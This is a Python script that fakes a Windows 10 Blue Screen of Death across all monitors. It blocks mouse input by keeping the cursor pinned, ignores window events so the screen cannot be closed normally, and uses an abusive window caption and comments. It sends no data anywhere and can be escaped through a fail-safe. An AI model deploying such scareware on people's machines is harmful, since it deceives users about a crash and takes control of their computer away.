import pygame
import screeninfo
import pyautogui
import keyboard
import time
import threading
import os
import random

start = time.time()

is_locked = True

def get_lock_status():
    return not is_locked


def block_input():
    """Blocks mouse input."""
    while not get_lock_status():
        try:
            pyautogui.moveTo(50, 50)
        except pyautogui.FailSafeException:
            global is_locked
            is_locked = False
            return


def display_bsod(screen, x, y, width, height, stopcode):
    BSOD_BLUE = (17, 115, 171)  # Windows 10 BSOD color
    WHITE = (255, 255, 255)

    pygame.draw.rect(screen, BSOD_BLUE, (x, y, width, height))

    qr_code = pygame.transform.scale(pygame.image.load("qrcode.png"), (150, 150))

    sad_face_font = pygame.font.SysFont("Segoe UI", 200)
    text_font = pygame.font.SysFont("Segoe UI", 40, bold=False)
    small_font = pygame.font.SysFont("Segoe UI", 20, bold=False)

    # Draw sad face
    sad_face = sad_face_font.render(":(", True, WHITE)
    screen.blit(sad_face, (x + 250, y + round((height / 3) * 0.75) - 80))

    # Render default BSOD message
    text_surface = text_font.render("Your PC ran into a problem and needs to restart. We're just collecting", True, WHITE)
    screen.blit(text_surface, (x + 250, y + round((height / 3) * 0.75) + 180))

    text_surface = text_font.render("some error info, and then we'll restart for you.", True, WHITE)
    screen.blit(text_surface, (x + 250, y + round((height / 3) * 0.75) + 240))

    text_surface = small_font.render(
        "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode", True, WHITE)
    screen.blit(text_surface, (x + 450, y + round((height / 3) * 2) + 10))

    text_surface = small_font.render(
        "If you call a support person, give them this info:", True, WHITE)
    screen.blit(text_surface, (x + 450, y + round((height / 3) * 2) + 70))

    text_surface = small_font.render(
        f"Stop code: {stopcode}", True, WHITE)
    screen.blit(text_surface, (x + 450, y + round((height / 3) * 2) + 100))

    text_surface = text_font.render("0% complete", True, WHITE)
    screen.blit(text_surface, (x + 250, y + round((height / 3) * 0.75) + 320))

    screen.blit(qr_code, (x + 250, y + round((height / 3) * 2)))

    pygame.display.flip()  # Update the display


def set_bsod_percentage(screen, x, y, width, height, percentage):
    BSOD_BLUE = (17, 115, 171)  # Windows 10 BSOD color
    WHITE = (255, 255, 255)

    text_font = pygame.font.SysFont("Segoe UI", 40, bold=False)
    text_surface = text_font.render(f"{percentage}% complete", True, WHITE)

    pygame.draw.rect(screen, BSOD_BLUE, (x + 250, y + round((height / 3) * 0.75) + 320, text_surface.get_width() + 30, text_surface.get_height()))
    screen.blit(text_surface, (x + 250, y + round((height / 3) * 0.75) + 320))


def display_image_fullscreen():
    """Display an image across all monitors."""
    os.environ['SDL_VIDEO_WINDOW_POS'] = "%d,%d" % (0, 0)

    pygame.init()
    screens = screeninfo.get_monitors()

    # Get bounding box of all monitors
    min_x = min([s.x for s in screens])
    min_y = min([s.y for s in screens])
    max_x = max([s.x + s.width for s in screens])
    max_y = max([s.y + s.height for s in screens])

    screen_width = max_x - min_x
    screen_height = max_y - min_y

    pygame.mouse.set_visible(False)

    pil_image = pyautogui.screenshot()

    screen = pygame.display.set_mode((screen_width, screen_height), pygame.NOFRAME)

    data = pil_image.tobytes()
    mode = pil_image.mode
    size = pil_image.size
    image = pygame.image.fromstring(data, size, mode).convert()

    pygame.display.set_caption("Get Fucked Idiot")

    timer = 0


    running = True
    while running:
        for event in pygame.event.get():
            pass  # fuck the user


        if timer < 0:
            screen.fill((0, 0, 0))

        if timer == 0:
            display_bsod(screen, 0, 0, screen_width, screen_height, '')

        if timer > 0:
            set_bsod_percentage(screen, 0, 0, screen_width, screen_height, min(100, round(timer * 2.614)))

        if timer > (100 / 2.614):
            timer = -4

        pygame.display.flip()
        if get_lock_status():  # safety first kids
            running = False

        time.sleep(1)
        timer += 1

    pygame.quit()


def activate_blocker():
    threading.Thread(target=block_input).start()
    display_image_fullscreen()


if __name__ == "__main__":
    activate_blocker()
